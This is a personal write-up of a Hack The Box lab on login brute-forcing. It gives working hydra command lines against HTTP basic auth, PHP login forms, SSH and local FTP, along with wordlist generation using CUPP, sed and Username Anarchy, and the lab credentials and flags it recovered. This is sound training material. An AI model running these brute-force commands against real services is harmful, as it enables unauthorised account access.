# Login Brute Forcing
28 August 2023

## Intro
Files storing hashed passes (Linux) `shadow`, `shadow.bak`... Windows is `unattended.xml`, `SAM`...

Tools for brute forcing:
- Ncrack
- wfuzz
- medusa
- patator
- hydra

Module mainly uses hydra. 


## Basic HTTP Auth Brute
> As we don't have any credentials, nor do we have any other ports available, and no services or information about the webserver to be able to use or attack, the only option left is to utilize password brute-forcing.

### Password Attacks
Describing brute force vs dictionary. Common usernames and passes are in the SecLists repo. 


### Default Passwords
Installing hydra can be done via `apt intall hydra -y` or via the [GitHub Repo](https://github.com/vanhauser-thc/thc-hydra). 

Hydra running was easy via its flags and gave result of `admin:admin`


### Username Brute Force
File `rockyou.txt` has 14m entries, sorted by how common they are. *should* be in the SecLists/Passwords/Leaked-Databases/ folder, but also available on the [hashcat repo](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).

also utilising a `usernames.txt` file from SecLists. `locate` good command on linux to find files 

In this excercise following flags are added to hydra:
-L for usernames, -P for passwords, -f for the first successful login. -u to loop on usernames per password, instead of loop on passwords per username. 

Weirdly the VM provided by HTB had permissions on the rockyou file, so downloaded it again on the VM. 

```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f $SERVER_IP -s $PORT http-get /
```

Thing ran for 7mins and no results yet. Strange. Answer for the excercise was the same as the previous one. 

## Web Forms Brute Forcing

### Hydra Modules
Many admin panels have also implemented features or elements such as the [b374k shell](https://github.com/b374k/b374k) that might allow us to execute OS commands directly. 

Recommended you do the top 10 admin creds to limit your network presence. 

Hydra supports many different request types for the different services. 

As we got through with `admin:admin`, the next page is a `.php` page. So, we should use the `http-post-form` module. 

Hydra will need success / failure criteria for the post module. E.g:
```bash
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

Will say that we have failure when we have found "<form name='login'>" (remove the >) in the html content. So success is when we do not have the form for login. 


### Determine Login Params
Check the dev tools with an attempt. Or burp it. We could also copy it as cURL. Gives the creds as the format of ` --data-raw 'username=test&password=test'.`

This then in hydra would be:
```bash
"/login.php:username=admin&password=admin:F=<form name='login'"
```

for the credentials of admin & admin. 


### Login Form Attacks
using `ftp-betterdefaultpasslist.txt` from SecLists as a starting point:
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP -s $PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
This did not work, but ran quickly. 

Trying a password wordlist with some known users such as `admin, asministrator, wpadmin, root, adm`.

```bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f $IP -s $PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

Ran into problems when there was no "=" between the F and failure criteria.

### Personalised wordlists
Gathering information about them needed, here are some to make some wordlists based on information gathered.

#### CUPP
install via `sudo apt install cupp` or [GitHub Repo](https://github.com/Mebus/cupp). The interactive session is helpful via `cupp -i`. 

But, if we know there is a password policy then we will have to do some trimming of the text file. This can be done with `sed`. 

```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

#### Mangling
We never truly know how our target thinks, so we should add some permutations to the passwords via things like [rsmangler](https://github.com/digininja/RSMangler) or [The Mantelist](https://github.com/sc0tfree/mentalist). Making the list longer increases chances, but also time to run.


#### Custom username list
Also consider the username of the person. Bill Gates could have a username of `b.gates` or `gates` or even `bigbillsy`. We can use [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) and run via terminal:

```bash
./username-anarchy Bill Gates > bill.txt
```


### SSH Attack
Simply change the protocol for hydra, so `ssh://` instead of `http-get` at the end.

```bash
hydra -L bill.txt -P william.txt -u -f ssh://$IP:$PORT -t 4
```

This gave a username and password, so then login:
```bash
ssh b.gates@$IP -p $PORT
```

Gave flag of `flag.txt` and then when we `ls /home` we can see another user of `m.gates` along with seeing what ports are open with `netstat -antp | grep -i list`. Doing `which hydra` also shown it, which means we can run it under Bills account. `rockyou-10.txt` was provided locally to run on the FTP port.


```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1 
```

This surprisingly worked, though it did not show the IPv4 port open, just IPv6. FTP-ing in on bills machine to m.gates:
```bash
ftp 127.0.0.1
```
Then provide `m.gates` as user with `computer` as password. Running `dir` shows the directory listing. Running `get flag.txt` then downloaded it to bills local, overwriting the previous flag.txt. it is now `HTB{1_4m_@_bru73_f0rc1n6_m4573r}`. Changing users via `su - m.gates` and typing in the password just seems lucky(?) but the flag is the same there to confirm. 


### Assessment - Brute Forcing
Successful first try on Q1 running:
```bash
hydra -C SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP -s $PORT http-get /
```
creds came quick which led to flag when logging in. 


Second stage is a http post, need to find user and pass. Trying a range from earlier:
```bash
hydra -l user -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f $IP -s $PORT http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='login'"
```

Had to re-download the rockyou file which was a little fiddly due to no shared clipboard. `user` and `123456` were given but does not seem to work. Trying a list of top admins from `SecLists/Usernames/top-usernames-shortlist.txt` gives another one of `root` and `123456`

Ah so looking at the HTML, the form is called "log-in" and not "login", repeating above with the edit now gives

### Assessment - Service
Q2 - ssh brute forcing 
Password poligy on the admin page:
Must be 8 characters or longer
Must contain numbers
Must contain special characters

Taking its time.....

Finally got a quick hit thanks to:
1. Generating a password file from just harry potter, no other information
2. Truncate file using sed like before
3. ran `hydra -L harry-usr.txt -P harry-pss.txt` with flags `-f` and `-u`. Hit with `harry.potter` and pass `H4rry!!!`

Now looking for ports, there is a 21 like before. So repeating:

```bash
hydra -l g.potter -P rockyou-30.txt ftp://127.0.0.1 -p 21
```

Think this was purposefully chosen to make me wait before finding a login. Finally worked with password harry and repeated steps abpve to get the final flag. 
